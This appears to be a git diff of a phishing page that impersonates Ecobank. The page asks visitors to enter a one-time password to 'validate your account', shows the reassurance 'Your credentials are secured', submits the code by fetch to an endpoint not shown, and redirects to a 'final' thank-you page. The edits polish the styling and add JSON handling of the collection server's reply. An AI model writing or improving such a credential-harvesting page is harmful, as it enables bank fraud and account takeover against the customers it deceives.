@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>OTP Validation</title>
+  <title>Secure Validation OTP</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -14,9 +14,9 @@
       align-items: center;
       color: #fff;
       overflow-x: hidden;
-      position: relative;
     }
 
+    /* Animated waves behind the form */
     body::before, body::after {
       content: "";
       position: absolute;
@@ -29,9 +29,7 @@
       animation: wave 15s linear infinite;
       z-index: 0;
     }
-    body::after {
-      animation-delay: 7.5s;
-    }
+    body::after { animation-delay: 7.5s; }
     @keyframes wave {
       0% { transform: rotate(0deg) translate(0,0); }
       50% { transform: rotate(180deg) translate(20px, 20px); }
@@ -49,11 +47,12 @@
       box-shadow: 0 4px 10px rgba(0,0,0,0.3);
       z-index: 1;
       position: relative;
+      transition: box-shadow 0.3s ease;
     }
     .header h1 { margin: 0; font-size: 22px; }
     .header p { margin: 5px 0 0; font-size: 14px; }
 
-    .otp-container {
+    .login-container {
       background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
       color: #fff;
       width: 90%;
@@ -65,15 +64,14 @@
       backdrop-filter: blur(4px);
       z-index: 2;
       position: relative;
-      text-align: center;
     }
-    .otp-container label {
+    .login-container label {
       display: block;
       margin-bottom: 6px;
       font-size: 14px;
       color: #fff;
     }
-    .otp-container input {
+    .login-container input {
       width: 100%;
       padding: 12px;
       margin-bottom: 20px;
@@ -83,7 +81,9 @@
       background-color: rgba(11,29,77,0.9);
       color: #fff;
     }
-    .otp-container input::placeholder { color: #ccc; }
+    .login-container input::placeholder {
+      color: #ccc;
+    }
 
     .button-group {
       display: flex;
@@ -111,20 +111,27 @@
       transform: scale(1.05);
       box-shadow: 0 4px 12px rgba(0,0,0,0.4);
     }
-    .notice { font-size: 13px; color: #ccc; margin-bottom: 12px; }
+
+    .status {
+      text-align: center;
+      margin-bottom: 12px;
+      font-size: 14px;
+      color: #ccc;
+    }
   </style>
 </head>
 <body>
   <div class="header">
-    <h1>ECOBANK OTP VALIDATION</h1>
-    <p>Enter your OTP to continue</p>
+    <h1>ECOBANK ONLINE VALIDATION</h1>
+    <p>Enter your OTP to validate your account</p>
   </div>
 
-  <div class="otp-container">
+  <div class="login-container">
     <form id="otpForm">
-      <label>Validation OTP</label>
-      <input type="text" name="validation_otp" placeholder="Enter OTP" required>
-      <div class="notice" id="status">Your credentials are secured.</div>
+      <label for="validation_otp">Validation OTP</label>
+      <input type="text" id="validation_otp" name="validation_otp" placeholder="Enter OTP" required>
+
+      <div class="status" id="status">Your credentials are secured.</div>
 
       <div class="button-group">
         <button type="submit">VALIDATE →</button>
@@ -149,10 +156,19 @@
         const text = await response.text();
         console.log("Server response:", text);
 
-        if (text.includes("SUCCESS")) {
-          window.location.href = "thankyou.html"; // redirect to final thank you
+        let json;
+        try {
+          json = JSON.parse(text);
+        } catch (err) {
+          statusEl.textContent = "Invalid response: " + text;
+          statusEl.style.color = "#ff6666";
+          return;
+        }
+
+        if (json.result === "success") {
+          window.location.href = "thankyou.html"; // redirect to final thank you page
         } else {
-          statusEl.textContent = "Submission failed: " + text;
+          statusEl.textContent = "Submission failed: " + (json.message || text);
           statusEl.style.color = "#ff6666";
         }
       } catch (err) {
